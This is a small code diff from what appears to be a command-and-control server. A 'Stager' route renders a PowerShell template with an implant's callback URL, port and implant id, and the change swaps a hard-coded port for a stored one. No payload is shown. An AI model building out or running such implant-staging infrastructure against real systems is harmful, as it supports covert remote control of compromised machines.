@@ -41,7 +41,7 @@ def Stager():
         template = env.get_template('jinja_fudge.ps1')
         print(b[0]['callback_url'],b[0]['stager_key'])
         db.Update_ImplantLastCheckIn(request.values['user'])
-        output_from_parsed_template = template.render(url=b[0]['callback_url'], port=5000, uii=b[0]['unique_implant_id'])
+        output_from_parsed_template = template.render(url=b[0]['callback_url'], port=b[0]['port'], uii=b[0]['unique_implant_id'])
     else:
         return "404", 404
     #print(output_from_parsed_template)
